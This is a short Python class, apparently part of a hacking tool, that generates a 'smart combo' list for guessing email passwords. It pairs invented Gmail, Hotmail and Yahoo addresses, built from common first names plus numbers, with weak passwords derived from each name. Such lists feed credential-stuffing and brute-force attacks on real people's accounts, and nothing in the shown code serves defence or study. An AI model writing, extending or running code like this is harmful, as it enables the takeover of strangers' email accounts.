class MohaGenerator:
    def __init__(self):
        self.names = ['amine', 'mohamed', 'abdou', 'mounir', 'anis', 'walid']
        self.domains = ['@gmail.com', '@hotmail.com', '@yahoo.com']

    def create_smart_combo(self, custom_names=None):
        target_names = custom_names if custom_names else self.names
        print(f" {C}[*] {W}Generating Smart Combo...")
        combo = []
        for name in target_names:
            for i in range(10, 99):
                email = f"{name}{i}{random.choice(self.domains)}"
                pws = [name+name, name+"02", name+"2007", name+"@02", name+"123"]
                combo.append({'email': email, 'pws': pws})
        return combo

